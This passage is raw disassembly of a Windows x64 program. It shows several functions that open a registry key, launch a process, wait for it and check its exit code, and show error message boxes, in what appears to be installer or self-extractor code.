   1400042ba:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400042be:	48 0f 45 c1          	cmovne %rcx,%rax
   1400042c2:	44 88 28             	mov    %r13b,(%rax)
   1400042c5:	44 3b f7             	cmp    %edi,%r14d
   1400042c8:	75 5e                	jne    0x140004328
   1400042ca:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400042d0:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400042d4:	48 8d 0d 0d 56 00 00 	lea    0x560d(%rip),%rcx        # 0x1400098e8
   1400042db:	e8 70 0d 00 00       	call   0x140005050
   1400042e0:	85 c0                	test   %eax,%eax
   1400042e2:	0f 84 6c ff ff ff    	je     0x140004254
   1400042e8:	44 38 2d 33 8c 00 00 	cmp    %r13b,0x8c33(%rip)        # 0x14000cf22
   1400042ef:	0f 85 e3 02 00 00    	jne    0x1400045d8
   1400042f5:	48 8d 05 ac 55 00 00 	lea    0x55ac(%rip),%rax        # 0x1400098a8
   1400042fc:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140004300:	44 8b ce             	mov    %esi,%r9d
   140004303:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004308:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000430c:	8b d7                	mov    %edi,%edx
   14000430e:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140004313:	48 ff 15 de 4e 00 00 	rex.W call *0x4ede(%rip)        # 0x1400091f8
   14000431a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000431f:	83 f8 02             	cmp    $0x2,%eax
   140004322:	0f 84 b0 02 00 00    	je     0x1400045d8
   140004328:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000432d:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140004332:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004336:	e8 49 d3 ff ff       	call   0x140001684
   14000433b:	85 c0                	test   %eax,%eax
   14000433d:	0f 84 ab 01 00 00    	je     0x1400044ee
   140004343:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   140004347:	45 85 e4             	test   %r12d,%r12d
   14000434a:	75 1e                	jne    0x14000436a
   14000434c:	66 39 3d 25 9b 00 00 	cmp    %di,0x9b25(%rip)        # 0x14000de78
   140004353:	74 15                	je     0x14000436a
   140004355:	44 39 2d a4 89 00 00 	cmp    %r13d,0x89a4(%rip)        # 0x14000cd00
   14000435c:	74 0c                	je     0x14000436a
   14000435e:	85 db                	test   %ebx,%ebx
   140004360:	75 10                	jne    0x140004372
   140004362:	44 8b e7             	mov    %edi,%r12d
   140004365:	e8 be d9 ff ff       	call   0x140001d28
   14000436a:	85 db                	test   %ebx,%ebx
   14000436c:	0f 84 21 01 00 00    	je     0x140004493
   140004372:	44 39 2d 2f 7e 00 00 	cmp    %r13d,0x7e2f(%rip)        # 0x14000c1a8
   140004379:	0f 84 1a 02 00 00    	je     0x140004599
   14000437f:	85 db                	test   %ebx,%ebx
   140004381:	0f 84 0c 01 00 00    	je     0x140004493
   140004387:	f6 05 d6 9a 00 00 04 	testb  $0x4,0x9ad6(%rip)        # 0x14000de64
   14000438e:	0f 84 ff 00 00 00    	je     0x140004493
   140004394:	e8 57 36 00 00       	call   0x1400079f0
   140004399:	48 8b f8             	mov    %rax,%rdi
   14000439c:	48 85 c0             	test   %rax,%rax
   14000439f:	0f 84 cf 01 00 00    	je     0x140004574
   1400043a5:	48 8d 15 14 7e 00 00 	lea    0x7e14(%rip),%rdx        # 0x14000c1c0
   1400043ac:	48 8b c8             	mov    %rax,%rcx
   1400043af:	48 ff 15 aa 4e 00 00 	rex.W call *0x4eaa(%rip)        # 0x140009260
   1400043b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400043bb:	48 8b d0             	mov    %rax,%rdx
   1400043be:	48 85 c0             	test   %rax,%rax
   1400043c1:	0f 84 5a 01 00 00    	je     0x140004521
   1400043c7:	44 39 2d 42 89 00 00 	cmp    %r13d,0x8942(%rip)        # 0x14000cd10
   1400043ce:	48 8d 05 a3 91 00 00 	lea    0x91a3(%rip),%rax        # 0x14000d578
   1400043d5:	0f b7 0d 9c 9a 00 00 	movzwl 0x9a9c(%rip),%ecx        # 0x14000de78
   1400043dc:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400043e1:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400043e6:	48 8d 05 23 92 00 00 	lea    0x9223(%rip),%rax        # 0x14000d610
   1400043ed:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400043f2:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400043f6:	66 89 4c 24 70       	mov    %cx,0x70(%rsp)
   1400043fb:	0f b7 0d 16 89 00 00 	movzwl 0x8916(%rip),%ecx        # 0x14000cd18
   140004402:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140004407:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   14000440c:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140004411:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004415:	74 08                	je     0x14000441f
   140004417:	0f ba e9 10          	bts    $0x10,%ecx
   14000441b:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   14000441f:	8b 05 3f 9a 00 00    	mov    0x9a3f(%rip),%eax        # 0x14000de64
   140004425:	a8 08                	test   $0x8,%al
   140004427:	74 08                	je     0x140004431
   140004429:	0f ba e9 11          	bts    $0x11,%ecx
   14000442d:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140004431:	a8 10                	test   $0x10,%al
   140004433:	74 08                	je     0x14000443d
   140004435:	0f ba e9 12          	bts    $0x12,%ecx
   140004439:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   14000443d:	8b 05 e5 8b 00 00    	mov    0x8be5(%rip),%eax        # 0x14000d028
   140004443:	a8 40                	test   $0x40,%al
   140004445:	74 08                	je     0x14000444f
   140004447:	0f ba e9 13          	bts    $0x13,%ecx
   14000444b:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   14000444f:	84 c0                	test   %al,%al
   140004451:	79 08                	jns    0x14000445b
   140004453:	0f ba e9 14          	bts    $0x14,%ecx
   140004457:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   14000445b:	8b 05 07 9a 00 00    	mov    0x9a07(%rip),%eax        # 0x14000de68
   140004461:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004466:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000446a:	48 8b c2             	mov    %rdx,%rax
   14000446d:	ff 15 dd 51 00 00    	call   *0x51dd(%rip)        # 0x140009650
   140004473:	89 05 cb 90 00 00    	mov    %eax,0x90cb(%rip)        # 0x14000d544
   140004479:	48 8b cf             	mov    %rdi,%rcx
   14000447c:	85 c0                	test   %eax,%eax
   14000447e:	78 53                	js     0x1400044d3
   140004480:	48 ff 15 f9 4d 00 00 	rex.W call *0x4df9(%rip)        # 0x140009280
   140004487:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000448c:	bf 01 00 00 00       	mov    $0x1,%edi
   140004491:	eb 1a                	jmp    0x1400044ad
   140004493:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004498:	48 85 db             	test   %rbx,%rbx
   14000449b:	74 42                	je     0x1400044df
   14000449d:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400044a1:	48 8b cb             	mov    %rbx,%rcx
   1400044a4:	e8 93 02 00 00       	call   0x14000473c
   1400044a9:	85 c0                	test   %eax,%eax
   1400044ab:	74 32                	je     0x1400044df
   1400044ad:	48 8b cb             	mov    %rbx,%rcx
   1400044b0:	48 ff 15 b9 4d 00 00 	rex.W call *0x4db9(%rip)        # 0x140009270
   1400044b7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400044bc:	44 03 f7             	add    %edi,%r14d
   1400044bf:	41 83 fe 02          	cmp    $0x2,%r14d
   1400044c3:	0f 83 0f 01 00 00    	jae    0x1400045d8
   1400044c9:	bb 03 00 00 00       	mov    $0x3,%ebx
   1400044ce:	e9 72 fc ff ff       	jmp    0x140004145
   1400044d3:	48 ff 15 a6 4d 00 00 	rex.W call *0x4da6(%rip)        # 0x140009280
   1400044da:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400044df:	48 8b cb             	mov    %rbx,%rcx
   1400044e2:	48 ff 15 87 4d 00 00 	rex.W call *0x4d87(%rip)        # 0x140009270
   1400044e9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400044ee:	33 c0                	xor    %eax,%eax
   1400044f0:	48 8b 8d 50 04 00 00 	mov    0x450(%rbp),%rcx
   1400044f7:	48 33 cc             	xor    %rsp,%rcx
   1400044fa:	e8 71 3f 00 00       	call   0x140008470
   1400044ff:	4c 8d 9c 24 60 05 00 	lea    0x560(%rsp),%r11
   140004506:	00 
   140004507:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000450b:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000450f:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   140004513:	49 8b e3             	mov    %r11,%rsp
   140004516:	41 5f                	pop    %r15
   140004518:	41 5e                	pop    %r14
   14000451a:	41 5d                	pop    %r13
   14000451c:	41 5c                	pop    %r12
   14000451e:	5d                   	pop    %rbp
   14000451f:	c3                   	ret
   140004520:	cc                   	int3
   140004521:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004526:	4c 8d 05 93 7c 00 00 	lea    0x7c93(%rip),%r8        # 0x14000c1c0
   14000452d:	45 33 c9             	xor    %r9d,%r9d
   140004530:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004537:	00 
   140004538:	ba c9 04 00 00       	mov    $0x4c9,%edx
   14000453d:	33 c9                	xor    %ecx,%ecx
   14000453f:	e8 88 08 00 00       	call   0x140004dcc
   140004544:	48 8b cf             	mov    %rdi,%rcx
   140004547:	48 ff 15 32 4d 00 00 	rex.W call *0x4d32(%rip)        # 0x140009280
   14000454e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004553:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004558:	48 ff 15 11 4d 00 00 	rex.W call *0x4d11(%rip)        # 0x140009270
   14000455f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004564:	e8 97 31 00 00       	call   0x140007700
   140004569:	89 05 d5 8f 00 00    	mov    %eax,0x8fd5(%rip)        # 0x14000d544
   14000456f:	e9 7a ff ff ff       	jmp    0x1400044ee
   140004574:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004579:	4c 8d 05 28 52 00 00 	lea    0x5228(%rip),%r8        # 0x1400097a8
   140004580:	45 33 c9             	xor    %r9d,%r9d
   140004583:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000458a:	00 
   14000458b:	ba c8 04 00 00       	mov    $0x4c8,%edx
   140004590:	33 c9                	xor    %ecx,%ecx
   140004592:	e8 35 08 00 00       	call   0x140004dcc
   140004597:	eb ba                	jmp    0x140004553
   140004599:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000459e:	45 33 c9             	xor    %r9d,%r9d
   1400045a1:	45 33 c0             	xor    %r8d,%r8d
   1400045a4:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400045ab:	00 
   1400045ac:	ba c7 04 00 00       	mov    $0x4c7,%edx
   1400045b1:	33 c9                	xor    %ecx,%ecx
   1400045b3:	e8 14 08 00 00       	call   0x140004dcc
   1400045b8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400045bd:	48 ff 15 ac 4c 00 00 	rex.W call *0x4cac(%rip)        # 0x140009270
   1400045c4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400045c9:	c7 05 71 8f 00 00 2b 	movl   $0x8007042b,0x8f71(%rip)        # 0x14000d544
   1400045d0:	04 07 80 
   1400045d3:	e9 16 ff ff ff       	jmp    0x1400044ee
   1400045d8:	44 39 2d 41 82 00 00 	cmp    %r13d,0x8241(%rip)        # 0x14000c820
   1400045df:	0f 84 48 01 00 00    	je     0x14000472d
   1400045e5:	44 38 2d e4 81 00 00 	cmp    %r13b,0x81e4(%rip)        # 0x14000c7d0
   1400045ec:	0f 84 3b 01 00 00    	je     0x14000472d
   1400045f2:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400045f7:	41 b9 1f 00 02 00    	mov    $0x2001f,%r9d
   1400045fd:	45 33 c0             	xor    %r8d,%r8d
   140004600:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004605:	48 8d 15 7c 7a 00 00 	lea    0x7a7c(%rip),%rdx        # 0x14000c088
   14000460c:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140004613:	48 ff 15 1e 4b 00 00 	rex.W call *0x4b1e(%rip)        # 0x140009138
   14000461a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000461f:	85 c0                	test   %eax,%eax
   140004621:	0f 85 06 01 00 00    	jne    0x14000472d
   140004627:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000462c:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004631:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004636:	48 8d 15 93 81 00 00 	lea    0x8193(%rip),%rdx        # 0x14000c7d0
   14000463d:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   140004644:	bb 38 02 00 00       	mov    $0x238,%ebx
   140004649:	45 33 c9             	xor    %r9d,%r9d
   14000464c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004651:	45 33 c0             	xor    %r8d,%r8d
   140004654:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140004658:	48 ff 15 19 4b 00 00 	rex.W call *0x4b19(%rip)        # 0x140009178
   14000465f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004664:	85 c0                	test   %eax,%eax
   140004666:	0f 85 b0 00 00 00    	jne    0x14000471c
   14000466c:	41 be 04 01 00 00    	mov    $0x104,%r14d
   140004672:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004679:	45 8b c6             	mov    %r14d,%r8d
   14000467c:	33 d2                	xor    %edx,%edx
   14000467e:	e8 86 44 00 00       	call   0x140008b09
   140004683:	41 8b d6             	mov    %r14d,%edx
   140004686:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   14000468d:	48 ff 15 7c 4b 00 00 	rex.W call *0x4b7c(%rip)        # 0x140009210
   140004694:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004699:	85 c0                	test   %eax,%eax
   14000469b:	74 16                	je     0x1400046b3
   14000469d:	4c 8d 05 5c 50 00 00 	lea    0x505c(%rip),%r8        # 0x140009700
   1400046a4:	41 8b d6             	mov    %r14d,%edx
   1400046a7:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1400046ae:	e8 f5 34 00 00       	call   0x140007ba8
   1400046b3:	48 8d 05 56 8f 00 00 	lea    0x8f56(%rip),%rax        # 0x14000d610
   1400046ba:	48 8b d3             	mov    %rbx,%rdx
   1400046bd:	4c 8d 8d 00 01 00 00 	lea    0x100(%rbp),%r9
   1400046c4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400046c9:	4c 8d 05 88 79 00 00 	lea    0x7988(%rip),%r8        # 0x14000c058
   1400046d0:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   1400046d7:	e8 70 ca ff ff       	call   0x14000114c
   1400046dc:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   1400046e3:	48 ff c6             	inc    %rsi
   1400046e6:	44 38 2c 30          	cmp    %r13b,(%rax,%rsi,1)
   1400046ea:	75 f7                	jne    0x1400046e3
   1400046ec:	03 f7                	add    %edi,%esi
   1400046ee:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   1400046f5:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400046f9:	48 8d 15 d0 80 00 00 	lea    0x80d0(%rip),%rdx        # 0x14000c7d0
   140004700:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004705:	44 8b cf             	mov    %edi,%r9d
   140004708:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000470d:	45 33 c0             	xor    %r8d,%r8d
   140004710:	48 ff 15 41 4a 00 00 	rex.W call *0x4a41(%rip)        # 0x140009158
   140004717:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000471c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004721:	48 ff 15 60 4a 00 00 	rex.W call *0x4a60(%rip)        # 0x140009188
   140004728:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000472d:	8b c7                	mov    %edi,%eax
   14000472f:	e9 bc fd ff ff       	jmp    0x1400044f0
   140004734:	cc                   	int3
   140004735:	cc                   	int3
   140004736:	cc                   	int3
   140004737:	cc                   	int3
   140004738:	cc                   	int3
   140004739:	cc                   	int3
   14000473a:	cc                   	int3
   14000473b:	cc                   	int3
   14000473c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004741:	55                   	push   %rbp
   140004742:	56                   	push   %rsi
   140004743:	57                   	push   %rdi
   140004744:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   14000474b:	ff 
   14000474c:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140004753:	48 8b 05 ae 78 00 00 	mov    0x78ae(%rip),%rax        # 0x14000c008
   14000475a:	48 33 c4             	xor    %rsp,%rax
   14000475d:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140004764:	33 c0                	xor    %eax,%eax
   140004766:	48 8b d9             	mov    %rcx,%rbx
   140004769:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   14000476e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004771:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140004776:	45 33 c9             	xor    %r9d,%r9d
   140004779:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000477e:	45 33 c0             	xor    %r8d,%r8d
   140004781:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140004786:	be 01 00 00 00       	mov    $0x1,%esi
   14000478b:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140004791:	48 8b d1             	mov    %rcx,%rdx
   140004794:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000479a:	33 c9                	xor    %ecx,%ecx
   14000479c:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   1400047a3:	00 
   1400047a4:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   1400047a9:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   1400047ae:	48 ff 15 db 4b 00 00 	rex.W call *0x4bdb(%rip)        # 0x140009390
   1400047b5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400047ba:	85 c0                	test   %eax,%eax
   1400047bc:	0f 84 f1 00 00 00    	je     0x1400048b3
   1400047c2:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400047c7:	83 ca ff             	or     $0xffffffff,%edx
   1400047ca:	48 ff 15 2f 4b 00 00 	rex.W call *0x4b2f(%rip)        # 0x140009300
   1400047d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400047d6:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400047db:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400047e0:	48 ff 15 d1 4b 00 00 	rex.W call *0x4bd1(%rip)        # 0x1400093b8
   1400047e7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400047ec:	83 3d 15 85 00 00 00 	cmpl   $0x0,0x8515(%rip)        # 0x14000cd08
   1400047f3:	8b 7c 24 50          	mov    0x50(%rsp),%edi
   1400047f7:	75 25                	jne    0x14000481e
   1400047f9:	8b 0d 5d 96 00 00    	mov    0x965d(%rip),%ecx        # 0x14000de5c
   1400047ff:	40 84 ce             	test   %cl,%sil
   140004802:	74 1a                	je     0x14000481e
   140004804:	f6 c1 02             	test   $0x2,%cl
   140004807:	75 15                	jne    0x14000481e
   140004809:	8b c7                	mov    %edi,%eax
   14000480b:	25 00 00 00 ff       	and    $0xff000000,%eax
   140004810:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   140004815:	0f 44 cf             	cmove  %edi,%ecx
   140004818:	89 0d 3e 96 00 00    	mov    %ecx,0x963e(%rip)        # 0x14000de5c
   14000481e:	f7 05 3c 96 00 00 00 	testl  $0x800,0x963c(%rip)        # 0x14000de64
   140004825:	08 00 00 
   140004828:	74 08                	je     0x140004832
   14000482a:	89 3d 14 8d 00 00    	mov    %edi,0x8d14(%rip)        # 0x14000d544
   140004830:	eb 4a                	jmp    0x14000487c
   140004832:	83 3d 07 8d 00 00 00 	cmpl   $0x0,0x8d07(%rip)        # 0x14000d540
   140004839:	75 37                	jne    0x140004872
   14000483b:	0f b7 0d 36 96 00 00 	movzwl 0x9636(%rip),%ecx        # 0x14000de78
   140004842:	8b 1d 34 96 00 00    	mov    0x9634(%rip),%ebx        # 0x14000de7c
   140004848:	e8 cb da ff ff       	call   0x140002318
   14000484d:	3b d8                	cmp    %eax,%ebx
   14000484f:	75 21                	jne    0x140004872
   140004851:	8b c7                	mov    %edi,%eax
   140004853:	25 00 00 00 ff       	and    $0xff000000,%eax
   140004858:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
   14000485d:	75 05                	jne    0x140004864
   14000485f:	40 84 fe             	test   %dil,%sil
   140004862:	75 0e                	jne    0x140004872
   140004864:	f7 05 f6 95 00 00 00 	testl  $0x200,0x95f6(%rip)        # 0x14000de64
   14000486b:	02 00 00 
   14000486e:	74 0c                	je     0x14000487c
   140004870:	eb b8                	jmp    0x14000482a
   140004872:	c7 05 c8 8c 00 00 c2 	movl   $0xbc2,0x8cc8(%rip)        # 0x14000d544
   140004879:	0b 00 00 
   14000487c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004881:	48 ff 15 b0 49 00 00 	rex.W call *0x49b0(%rip)        # 0x140009238
   140004888:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000488d:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004892:	48 ff 15 9f 49 00 00 	rex.W call *0x499f(%rip)        # 0x140009238
   140004899:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000489e:	f7 05 bc 95 00 00 00 	testl  $0x400,0x95bc(%rip)        # 0x14000de64
   1400048a5:	04 00 00 
   1400048a8:	74 74                	je     0x14000491e
   1400048aa:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   1400048af:	7d 6d                	jge    0x14000491e
   1400048b1:	eb 69                	jmp    0x14000491c
   1400048b3:	e8 48 2e 00 00       	call   0x140007700
   1400048b8:	89 05 86 8c 00 00    	mov    %eax,0x8c86(%rip)        # 0x14000d544
   1400048be:	48 ff 15 3b 49 00 00 	rex.W call *0x493b(%rip)        # 0x140009200
   1400048c5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048ca:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400048d0:	45 33 c9             	xor    %r9d,%r9d
   1400048d3:	44 8b c0             	mov    %eax,%r8d
   1400048d6:	c7 44 24 28 00 02 00 	movl   $0x200,0x28(%rsp)
   1400048dd:	00 
   1400048de:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400048e3:	33 d2                	xor    %edx,%edx
   1400048e5:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400048ea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048ef:	48 ff 15 a2 4a 00 00 	rex.W call *0x4aa2(%rip)        # 0x140009398
   1400048f6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048fb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004900:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140004905:	4c 8b c3             	mov    %rbx,%r8
   140004908:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000490f:	00 
   140004910:	ba c4 04 00 00       	mov    $0x4c4,%edx
   140004915:	33 c9                	xor    %ecx,%ecx
   140004917:	e8 b0 04 00 00       	call   0x140004dcc
   14000491c:	33 f6                	xor    %esi,%esi
   14000491e:	8b c6                	mov    %esi,%eax
   140004920:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140004927:	48 33 cc             	xor    %rsp,%rcx
   14000492a:	e8 41 3b 00 00       	call   0x140008470
   14000492f:	48 8b 9c 24 b0 02 00 	mov    0x2b0(%rsp),%rbx
   140004936:	00 
   140004937:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   14000493e:	5f                   	pop    %rdi
   14000493f:	5e                   	pop    %rsi
   140004940:	5d                   	pop    %rbp
   140004941:	c3                   	ret
   140004942:	cc                   	int3
   140004943:	cc                   	int3
   140004944:	cc                   	int3
   140004945:	cc                   	int3
   140004946:	cc                   	int3
   140004947:	cc                   	int3
   140004948:	cc                   	int3
   140004949:	cc                   	int3
   14000494a:	cc                   	int3
   14000494b:	cc                   	int3
   14000494c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004951:	57                   	push   %rdi
   140004952:	48 83 ec 30          	sub    $0x30,%rsp
   140004956:	45 33 c0             	xor    %r8d,%r8d
   140004959:	48 8d 0d 98 4f 00 00 	lea    0x4f98(%rip),%rcx        # 0x1400098f8
   140004960:	33 d2                	xor    %edx,%edx
   140004962:	e8 e9 06 00 00       	call   0x140005050
   140004967:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000496c:	8b f8                	mov    %eax,%edi
   14000496e:	8d 50 01             	lea    0x1(%rax),%edx
   140004971:	48 c1 e2 03          	shl    $0x3,%rdx
   140004975:	48 ff 15 4c 4a 00 00 	rex.W call *0x4a4c(%rip)        # 0x1400093c8
   14000497c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004981:	48 8b d8             	mov    %rax,%rbx
   140004984:	48 85 c0             	test   %rax,%rax
   140004987:	75 20                	jne    0x1400049a9
   140004989:	21 44 24 28          	and    %eax,0x28(%rsp)
   14000498d:	45 33 c9             	xor    %r9d,%r9d
   140004990:	45 33 c0             	xor    %r8d,%r8d
   140004993:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000499a:	00 
   14000499b:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400049a0:	33 c9                	xor    %ecx,%ecx
   1400049a2:	e8 25 04 00 00       	call   0x140004dcc
   1400049a7:	eb 74                	jmp    0x140004a1d
   1400049a9:	44 8b c7             	mov    %edi,%r8d
   1400049ac:	48 8d 0d 45 4f 00 00 	lea    0x4f45(%rip),%rcx        # 0x1400098f8
   1400049b3:	48 8b d3             	mov    %rbx,%rdx
   1400049b6:	e8 95 06 00 00       	call   0x140005050
   1400049bb:	85 c0                	test   %eax,%eax
   1400049bd:	75 16                	jne    0x1400049d5
   1400049bf:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400049c3:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400049c8:	45 33 c0             	xor    %r8d,%r8d
   1400049cb:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400049d2:	00 
   1400049d3:	eb 2f                	jmp    0x140004a04
   1400049d5:	48 8d 15 cc 4e 00 00 	lea    0x4ecc(%rip),%rdx        # 0x1400098a8
   1400049dc:	48 8b cb             	mov    %rbx,%rcx
   1400049df:	48 ff 15 ea 49 00 00 	rex.W call *0x49ea(%rip)        # 0x1400093d0
   1400049e6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049eb:	85 c0                	test   %eax,%eax
   1400049ed:	74 1f                	je     0x140004a0e
   1400049ef:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400049f4:	4c 8b c3             	mov    %rbx,%r8
   1400049f7:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400049fe:	00 
   1400049ff:	ba e9 03 00 00       	mov    $0x3e9,%edx
   140004a04:	45 33 c9             	xor    %r9d,%r9d
   140004a07:	33 c9                	xor    %ecx,%ecx
   140004a09:	e8 be 03 00 00       	call   0x140004dcc
   140004a0e:	48 8b cb             	mov    %rbx,%rcx
   140004a11:	48 ff 15 58 48 00 00 	rex.W call *0x4858(%rip)        # 0x140009270
   140004a18:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a1d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004a22:	48 83 c4 30          	add    $0x30,%rsp
   140004a26:	5f                   	pop    %rdi
   140004a27:	c3                   	ret
   140004a28:	cc                   	int3
   140004a29:	cc                   	int3
   140004a2a:	cc                   	int3
   140004a2b:	cc                   	int3
   140004a2c:	cc                   	int3
   140004a2d:	cc                   	int3
   140004a2e:	cc                   	int3
   140004a2f:	cc                   	int3
   140004a30:	48 83 ec 28          	sub    $0x28,%rsp
   140004a34:	83 fa 01             	cmp    $0x1,%edx
   140004a37:	75 17                	jne    0x140004a50
   140004a39:	ba 66 04 00 00       	mov    $0x466,%edx
   140004a3e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004a44:	48 ff 15 9d 4a 00 00 	rex.W call *0x4a9d(%rip)        # 0x1400094e8
   140004a4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a50:	33 c0                	xor    %eax,%eax
